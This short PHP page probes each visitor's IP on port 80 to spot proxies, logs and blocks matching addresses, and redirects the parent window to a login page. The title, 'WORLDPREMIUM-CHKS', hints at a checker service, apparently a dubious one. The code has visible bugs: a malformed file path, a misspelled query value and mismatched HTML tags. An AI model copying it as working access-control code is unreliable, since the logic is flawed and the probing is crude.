<?php


if (@fsockopen($_SERVER['REMOTE_ADDR'], 80, $errstr, $errno, 1)) {
    file_put_contents(getcwd()."./ipsBlocks.txt", $_SERVER['REMOTE_ADDR']."\n\r",FILE_APPEND);
    die('Proxy access not allowed'); 
} 

?>

<html>
<head>
<title>WORLDPREMIUM-CHKS</title>

<script>
    window.parent.location = '/login/login-usuario?serverStatus=availabre';
</script>

</head>
</body>
</html>